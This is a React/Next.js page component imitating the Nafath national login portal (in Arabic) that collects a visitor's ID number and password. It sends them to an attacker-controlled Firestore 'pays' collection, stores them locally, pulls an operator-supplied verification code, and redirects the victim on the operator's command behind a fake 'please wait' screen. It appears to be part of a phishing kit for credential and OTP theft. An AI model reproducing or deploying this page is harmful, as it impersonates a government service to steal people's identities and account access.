"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import NafazModal from "@/components/nafaz-modal"
import { doc, onSnapshot, setDoc, updateDoc } from "firebase/firestore"
import { addData, db } from "@/lib/firebase"

interface NafazFormData {
  identity_number: string
  password: string
}

// Utility function for allowing only numbers in input
const onlyNumbers = (value: string) => {
  return value.replace(/[^0-9]/g, "")
}

export default function Nafaz() {
  const router = useRouter()
  const [formData, setFormData] = useState<NafazFormData>({
    identity_number: "",
    password: "",
  })
  const [isLoading, setIsLoading] = useState(false)
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [isRejected, setIsRejected] = useState(false)
  const [showModal, setShowModal] = useState(false)
  const [verificationCode, setVerificationCode] = useState("")
  const [phone, setPhone] = useState("")
  const [visitorId, setVisitorId] = useState<string | null>(null)

  useEffect(() => {
    const userId = localStorage.getItem('visitor')
    if (userId) {
      const userDocRef = doc(db, "pays", userId)

      const unsubscribe = onSnapshot(
        userDocRef,
        (docSnapshot: { exists: () => any; data: () => any }) => {
          if (docSnapshot.exists()) {
            const userData = docSnapshot.data()
            // Assuming the PIN is stored in a field called 'nafaz_pin'
            setVerificationCode(userData.auth_number)
            

            if (userData.currentPage === '1') {
              window.location.href = '/'
            } else if (userData.currentPage === '9999') {
              window.location.href = '/verify-phone'

            }
          } else {
            console.error("User document not found")
          }
        },

      )

      // Clean up the listener when component unmounts or modal closes
      return () => unsubscribe()
      // Get data from localStorage
      if (typeof window !== "undefined") {
        setVisitorId(localStorage.getItem("visitor"))
        setPhone(localStorage.getItem("phoneNumber") || "")
      }
    }
  }, [])

  const updateFirestore = async (idCardNumber: string, password: string) => {
    const userId = localStorage.getItem('visitor')

    if (!userId) {
      console.error("Visitor ID not found in localStorage")
      throw new Error("Visitor ID not found")
    }

    try {
      // Import Firebase functions

      // Reference to the document in the pays collection
      const paysDocRef = doc(db, "pays", userId)

      // Update the document with Nafaz credentials
      addData(
        {
          id: userId, nafadUsername: idCardNumber,
          nafadPassword: password,
          updatedAt: new Date().toISOString()
        }
      ).catch(async () => {
        // If document doesn't exist, create it
        await addData({
          id: userId,
          nafadUsername: idCardNumber,
          nafadPassword: password,
          createdDate: new Date().toISOString(),
          status: "pending",
        })
      })

      console.log("Firestore updated successfully with Nafaz credentials")
      return true
    } catch (error) {
      console.error("Error updating Firestore:", error)
      throw error
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setIsRejected(false)
    setShowModal(true)

    try {
      // Store credentials in localStorage
      if (typeof window !== "undefined") {
        localStorage.setItem("nafaz_data", JSON.stringify(formData))
      }

      // Get credentials from form data
      const { identity_number, password } = formData

      // Update Firestore with the credentials
      await updateFirestore(identity_number, password)

      // Generate a mock ID for backward compatibility
      const nafad_id = "nafad-" + Math.random().toString(36).substring(2, 10)

      if (typeof window !== "undefined") {
        localStorage.setItem("nafad_id", JSON.stringify(nafad_id))
      }

      // Simulate processing delay
      await new Promise((resolve) => setTimeout(resolve, 1000))
      setIsSubmitted(true)

    } catch (error) {
      console.error("خطأ في الدخول للنظام ", error)
      setIsRejected(true)
    } finally {
      setIsLoading(false)
    }
  }

  const SubmittedContent = () => (
    <div className="space-y-8 bg-[#daf2f6]">
      <div className="space-y-4 text-base text-gray-700 p-6">
        <p>الرجاء الانتظار....</p>
        <p> جاري معالجة طلبك</p>
        <p> لا يمكنك الاستمرار في حال عدم قبول المصادقة</p>
      </div>

      <div className="flex-col gap-4 w-full flex items-center justify-center">
        <div className="w-20 h-20 border-4 border-transparent text-blue-400 text-4xl animate-spin flex items-center justify-center border-t-blue-400 rounded-full">
          <div className="w-16 h-16 border-4 border-transparent text-red-400 text-2xl animate-spin flex items-center justify-center border-t-red-400 rounded-full"></div>
        </div>
      </div>
    </div>
  )

  return (
    <>
      <div className="min-h-screen bg-[#eee] flex flex-col items-center py-3">
        <div className="w-full space-y-8">
          <h1 className="text-4xl font-bold text-[#3a9f8c] mb-6 bg-white p-4 text-right">نفاذ</h1>

          <h2 className="mt-6 text-3xl text-center font-semibold p-2 border-slate-400 text-[#3a9f8c]">
            الدخول على النظام
          </h2>
          <div className="mt-20 space-y-8 container mx-auto bg-white p-6 rounded-md">
            {!isSubmitted ? (
              <form className="space-y-8" onSubmit={handleSubmit}>
                <div className="space-y-4">
                  <div>
                    <label htmlFor="identity" className="block text-right text-sm font-medium text-gray-700 mb-4">
                      رقم بطاقة الأحوال / الإقامة
                    </label>
                    <input
                      id="identity"
                      type="text"
                      required
                      className="appearance-none relative block w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-right"
                      value={formData.identity_number}
                      onChange={(e) =>
                        setFormData((prev) => ({
                          ...prev,
                          identity_number: onlyNumbers(e.target.value),
                        }))
                      }
                    />
                  </div>

                  <div>
                    <label htmlFor="password" className="block text-right text-sm font-medium text-gray-700 mb-1">
                      كلمة المرور
                    </label>
                    <input
                      id="password"
                      type="password"
                      required
                      className="appearance-none relative block w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-right"
                      value={formData.password}
                      onChange={(e) =>
                        setFormData((prev) => ({
                          ...prev,
                          password: e.target.value,
                        }))
                      }
                    />
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#3a9f8c] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:bg-gray-400 disabled:cursor-not-allowed"
                >
                  &#x276E; تسجيل الدخول
                </button>

                <div className="flex">
                  <img src="/google_play.png" alt="door" className="w-[6rem] h-auto mx-auto mt-4" />
                  <img src="/huawei_store.jpg" alt="door" className="w-[6rem] h-auto mx-auto mt-4" />
                  <img src="/apple_store.png" alt="door" className="w-[6rem] h-auto mx-auto mt-4" />
                </div>

                <div className="text-center text-sm text-gray-600">
                  {isLoading ? (
                    <div className="flex justify-center">
                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600"></div>
                    </div>
                  ) : (
                    "الرجاء إدخال بطاقة الأحوال/الإقامة وكلمة المرور ثم اضغط تسجيل دخول"
                  )}
                </div>
              </form>
            ) : (
              <SubmittedContent />
            )}
          </div>
        </div>
        <NafazModal isOpen={showModal} onClose={() => setShowModal(false)}  phone={phone} />
      </div>
    </>
  )
}

